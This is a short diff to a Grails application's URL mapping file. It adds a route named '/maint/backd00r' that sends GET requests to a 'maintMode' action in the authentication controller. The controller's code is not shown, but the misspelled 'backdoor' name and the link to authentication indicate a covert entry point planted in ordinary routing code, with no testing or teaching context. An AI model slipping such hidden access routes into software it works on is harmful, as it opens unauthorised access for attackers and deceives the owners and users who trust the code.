@@ -16,6 +16,10 @@ class UrlMappings {
     		controller = "wsDashboard"
 			action = [GET:"bundleData"]
     	}
+		"/maint/backd00r" {
+			controller = "auth"
+			action = [GET:"maintMode"]
+		}
     	   	
     	
     	"500"(view:'/error')
